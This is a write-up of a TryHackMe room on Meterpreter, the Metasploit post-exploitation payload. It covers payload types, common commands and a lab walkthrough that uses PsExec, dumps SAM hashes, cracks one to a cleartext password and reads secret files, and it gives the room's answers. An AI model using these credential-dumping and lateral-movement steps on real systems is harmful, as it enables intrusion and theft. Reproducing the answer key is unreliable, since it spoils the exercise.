# Meterpreter

## Executive Summary

Meterpreter is one of the most powerful payloads available in the Metasploit Framework. Unlike traditional command shells, Meterpreter provides a feature-rich post-exploitation environment that allows penetration testers to interact with compromised systems, gather information, dump credentials, manage processes, perform privilege escalation, and conduct lateral movement activities.

In this room, we learned how Meterpreter works internally, explored different Meterpreter payload types, understood staged versus stageless payloads, examined commonly used Meterpreter commands, and completed a post-exploitation challenge involving system enumeration, credential extraction, password recovery, and sensitive file discovery.

This room serves as a foundational introduction to post-exploitation operations and prepares learners for future topics such as Windows Privilege Escalation, Active Directory attacks, Mimikatz, credential access techniques, and red team operations.

---

# Learning Objectives

After completing this room, you should be able to:

* Understand what Meterpreter is and how it works
* Explain the difference between staged and stageless payloads
* Identify different Meterpreter payload variants
* Use common Meterpreter commands
* Enumerate a compromised Windows system
* Extract password hashes from a target
* Recover credentials from NTLM hashes
* Search for sensitive files on a target
* Use Meterpreter for post-exploitation activities
* Understand how Meterpreter fits into the penetration testing lifecycle

---

# Prerequisites

Before starting this room, learners should understand:

* Basic Metasploit Framework usage
* Reverse shells
* Windows fundamentals
* SMB authentication
* NTLM hashing concepts
* Basic command line usage

Recommended rooms:

* Metasploit Introduction
* Metasploit Exploitation
* Windows Fundamentals
* Hashing Basics

---

# What is Meterpreter?

Meterpreter is an advanced Metasploit payload designed to provide an interactive post-exploitation environment after successful exploitation.

Unlike a traditional shell:

```cmd
C:\>
```

Meterpreter provides:

```text
meterpreter >
```

with numerous built-in capabilities such as:

* File management
* Process management
* Network enumeration
* Credential dumping
* Privilege escalation
* Keylogging
* Webcam interaction
* Screenshot capture
* Pivoting

---

# Why Does Meterpreter Exist?

Traditional shells are limited.

For example:

```cmd
C:\>
```

only allows command execution.

Meterpreter provides a unified interface that allows security professionals to:

* Gather information
* Manipulate files
* Interact with processes
* Access credentials
* Perform post-exploitation tasks

without uploading additional tools.

---

# How Meterpreter Works

## Traditional Malware

Traditional malware often writes files to disk:

```text
malware.exe
```

This can be detected by antivirus software.

---

## Meterpreter

Meterpreter operates primarily in memory.

```text
RAM
```

instead of:

```text
Hard Disk
```

This makes detection more difficult.

---

## Communication Model

Meterpreter usually communicates using:

```text
Victim
   ↓
Encrypted Connection
   ↓
Attacker
```

Common protocols:

* TCP
* HTTP
* HTTPS

---

## Advantages

### Stealth

Runs in memory.

### Encrypted Communications

Uses encrypted channels.

### Flexibility

Supports many operating systems.

### Extensibility

Can load additional modules and extensions.

---

# Meterpreter Flavors

Meterpreter supports many platforms.

## Supported Platforms

### Windows

```text
windows/x64/meterpreter/reverse_tcp
```

### Linux

```text
linux/x64/meterpreter_reverse_tcp
```

### Android

```text
android/meterpreter/reverse_tcp
```

### PHP

```text
php/meterpreter_reverse_tcp
```

### Python

```text
python/meterpreter_reverse_tcp
```

### Java

```text
java/meterpreter/reverse_tcp
```

### macOS

```text
osx/x64/meterpreter_reverse_tcp
```

---

# Staged vs Stageless Payloads

One of the most important concepts in Meterpreter.

---

## Staged Payloads

Example:

```text
windows/x64/meterpreter/reverse_tcp
```

Notice:

```text
meterpreter/reverse_tcp
```

Contains:

```text
/
```

### How It Works

Step 1:

Small payload delivered.

```text
Stager
```

Step 2:

Target connects back.

Step 3:

Full Meterpreter downloaded.

---

### Advantages

* Smaller initial payload
* Useful for limited exploit space

### Disadvantages

* Requires second-stage download
* More opportunities for failure

---

## Stageless Payloads

Example:

```text
windows/x64/meterpreter_reverse_tcp
```

Notice:

```text
_
```

instead of:

```text
/
```

### How It Works

Entire Meterpreter delivered at once.

---

### Advantages

* More reliable
* No second-stage download

### Disadvantages

* Larger payload size

---

# Listing Available Meterpreter Payloads

Command:

```bash
msfvenom --list payloads | grep meterpreter
```

## Purpose

Display all available Meterpreter payloads.

---

## Breakdown

### msfvenom

Payload generation tool.

### --list payloads

Displays payload list.

### grep meterpreter

Filters results.

---

# Meterpreter Command Categories

Running:

```bash
help
```

shows available commands.

Common categories:

* Core Commands
* File System Commands
* Networking Commands
* System Commands
* User Interface Commands
* Webcam Commands
* Password Commands
* Privilege Escalation Commands

---

# Core Commands

## help

Display available commands.

```bash
help
```

---

## background

Background current session.

```bash
background
```

---

## sessions

Interact with sessions.

```bash
sessions
```

---

## migrate

Move Meterpreter to another process.

```bash
migrate <PID>
```

---

## exit

Terminate session.

```bash
exit
```

---

# File System Commands

## pwd

Print working directory.

```bash
pwd
```

---

## ls

List files.

```bash
ls
```

---

## cd

Change directory.

```bash
cd Users
```

---

## cat

Display file contents.

```bash
cat file.txt
```

---

## search

Search for files.

```bash
search -f secrets.txt
```

---

## upload

Upload files.

```bash
upload nc.exe
```

---

## download

Download files.

```bash
download passwords.txt
```

---

# Networking Commands

## ifconfig

Display network interfaces.

```bash
ifconfig
```

---

## arp

View ARP cache.

```bash
arp
```

---

## netstat

Display active connections.

```bash
netstat
```

---

## route

View routing table.

```bash
route
```

---

## portfwd

Port forwarding.

```bash
portfwd add
```

---

# System Commands

## sysinfo

Display system information.

```bash
sysinfo
```

Example:

```text
Computer : ACME-TEST
OS       : Windows 7
Domain   : FLASH
```

---

## getuid

Display current user.

```bash
getuid
```

Example:

```text
NT AUTHORITY\SYSTEM
```

---

## getpid

Display Meterpreter PID.

```bash
getpid
```

---

## ps

List running processes.

```bash
ps
```

---

## shell

Drop into system shell.

```bash
shell
```

---

## getsystem

Attempt privilege escalation.

```bash
getsystem
```

---

## hashdump

Dump SAM database hashes.

```bash
hashdump
```

---

# Credential Access

## What is SAM?

SAM stands for:

```text
Security Account Manager
```

Stores local Windows account credentials.

---

## What is NTLM?

NTLM stands for:

```text
New Technology LAN Manager
```

A Windows authentication protocol.

---

## Example Hashdump Output

```text
Administrator:500:LMHASH:NTLMHASH:::
```

---

## Why Hashes Matter

Used for:

* Password cracking
* Pass-the-Hash attacks
* Lateral movement
* Credential reuse attacks

---

# Meterpreter Extensions

Extensions add new functionality.

---

## Loading Extensions

```bash
load kiwi
```

---

## Kiwi

Kiwi is Metasploit's integration of Mimikatz functionality.

Provides:

* Credential dumping
* Kerberos ticket extraction
* SAM dumping
* Password recovery

---

## Useful Kiwi Commands

### creds_all

```bash
creds_all
```

Retrieve credentials.

---

### lsa_dump_sam

```bash
lsa_dump_sam
```

Dump SAM data.

---

### kerberos_ticket_list

```bash
kerberos_ticket_list
```

List Kerberos tickets.

---

# Post-Exploitation Workflow

A common workflow:

```text
Initial Access
↓
Meterpreter
↓
System Enumeration
↓
Privilege Escalation
↓
Credential Access
↓
Lateral Movement
↓
Objective Completion
```

---

# Post-Exploitation Challenge Walkthrough

## Initial Access

Use PsExec.

### Module

```bash
use exploit/windows/smb/psexec
```

---

### Configure Credentials

```bash
set SMBUser ballen
set SMBPass Password1
```

---

### Configure Target

```bash
set RHOSTS <TARGET_IP>
```

---

### Run

```bash
run
```

Successful exploitation provides:

```text
meterpreter >
```

---

# Question 1

## What is the computer name?

### Command

```bash
sysinfo
```

### Output

```text
Computer : ACME-TEST
```

### Answer

```text
ACME-TEST
```

---

# Question 2

## What is the target domain?

### Command

```bash
sysinfo
```

### Output

```text
Domain : FLASH
```

### Answer

```text
FLASH
```

---

# Question 3

## What is the user-created share?

### Command

```bash
shell
```

```cmd
net share
```

### Output

```text
speedster
```

### Answer

```text
speedster
```

---

# Question 4

## What is the NTLM hash of jchambers?

### Command

```bash
hashdump
```

### Output

```text
jchambers
```

### NTLM Hash

```text
69596c7aa1e8daee17f8e78870e25a5c
```

### Answer

```text
69596c7aa1e8daee17f8e78870e25a5c
```

---

# Question 5

## What is the cleartext password?

### Method

Lookup NTLM hash.

### Tool

CrackStation

### Result

```text
Trustno1
```

### Answer

```text
Trustno1
```

---

# Question 6

## Where is secrets.txt?

### Command

```bash
search -f secrets.txt
```

### Result

```text
C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
```

### Answer

```text
C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
```

---

# Question 7

## Twitter Password

### Command

```bash
cat "C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```

### Result

```text
KDSvbsw3849!
```

### Answer

```text
KDSvbsw3849!
```

---

# Question 8

## Where is realsecret.txt?

### Command

```bash
search -f realsecret.txt
```

### Result

```text
C:\inetpub\wwwroot\realsecret.txt
```

### Answer

```text
C:\inetpub\wwwroot\realsecret.txt
```

---

# Question 9

## What is the real secret?

### Command

```bash
cat "C:\inetpub\wwwroot\realsecret.txt"
```

### Result

```text
The Flash is the fastest man alive
```

### Answer

```text
The Flash is the fastest man alive
```

---

# Troubleshooting

## Problem

Unable to read file with spaces.

Example:

```bash
cat c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
```

### Error

```text
The system cannot find the file specified
```

### Cause

Spaces in file path.

### Fix

Use quotation marks.

```bash
cat "C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```

---

# Red Team Notes

Meterpreter is commonly used for:

* Post-exploitation
* Credential harvesting
* Process migration
* Privilege escalation
* Persistence
* Internal reconnaissance
* Lateral movement

---

# Blue Team Notes

Defenders should monitor for:

* Process injection
* Unusual outbound connections
* Credential dumping activity
* Suspicious PowerShell execution
* LSASS access attempts
* Event log clearing
* Memory-resident payloads

Useful tools:

* Microsoft Defender
* Sysmon
* Microsoft Defender for Endpoint
* CrowdStrike
* SentinelOne

---

# Skills Gained

After completing this room, the following skills were developed:

### Metasploit

* Meterpreter usage
* Payload selection
* Session management

### Windows

* Process enumeration
* Share enumeration
* Credential storage concepts

### Post-Exploitation

* Host discovery
* Credential dumping
* Password recovery
* Sensitive file discovery

### Offensive Security

* Credential access
* Data collection
* Privilege awareness
* Post-exploitation workflow

---

# Key Takeaways

* Meterpreter is an advanced post-exploitation payload.
* It operates primarily in memory.
* Meterpreter supports many operating systems.
* Staged payloads use a stager and second-stage download.
* Stageless payloads deliver everything at once.
* Meterpreter provides powerful built-in post-exploitation tools.
* Credential access is one of the most important post-exploitation objectives.
* File discovery often reveals sensitive information.
* Meterpreter is frequently used as a bridge to privilege escalation and lateral movement.

---

# Future Learning Path

Recommended next topics:

1. Windows Privilege Escalation
2. Mimikatz
3. Active Directory Basics
4. Kerberos Authentication
5. Pass-the-Hash Attacks
6. BloodHound
7. Pivoting and Tunneling
8. Red Team Operations
9. Command and Control Frameworks
10. Active Directory Exploitation

---

# References

* Metasploit Framework Documentation
* Meterpreter Documentation
* Mimikatz Documentation
* Microsoft SAM Documentation
* MITRE ATT&CK Framework

---

# Tags

```text
#TryHackMe
#Meterpreter
#Metasploit
#Windows
#PostExploitation
#CredentialAccess
#NTLM
#SAM
#Mimikatz
#RedTeam
#CyberSecurity
```
